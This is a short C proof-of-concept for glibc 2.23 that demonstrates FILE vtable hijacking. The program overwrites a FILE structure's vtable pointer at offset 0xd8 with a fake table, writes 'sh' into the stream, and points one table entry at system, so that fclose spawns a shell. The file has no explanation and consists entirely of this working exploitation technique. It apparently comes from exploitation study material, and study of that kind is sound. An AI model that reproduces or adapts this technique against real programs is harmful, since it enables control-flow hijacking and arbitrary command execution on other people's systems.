//libc2.23
#include<unistd.h>
#include<stdio.h>
#include<stdlib.h>
#include<string.h>


int main()
{
        FILE *fp=fopen("123.txt","r");
        printf("fp @ %p.\n",fp);
	unsigned long *fakevtable=malloc(0x90);
        printf("vtableptr @ %p.\n",(unsigned long *)*(unsigned long *)((char *)fp+0xd8));
	*(unsigned long *)((char *)fp+0xd8)=(unsigned long)fakevtable;
        printf("vtableptr @ %p.\n",(unsigned long *)*(unsigned long *)((char *)fp+0xd8));
	memcpy(fp,"sh",3);
	*(fakevtable+17)=(unsigned long)&system;
        fclose(fp);
}

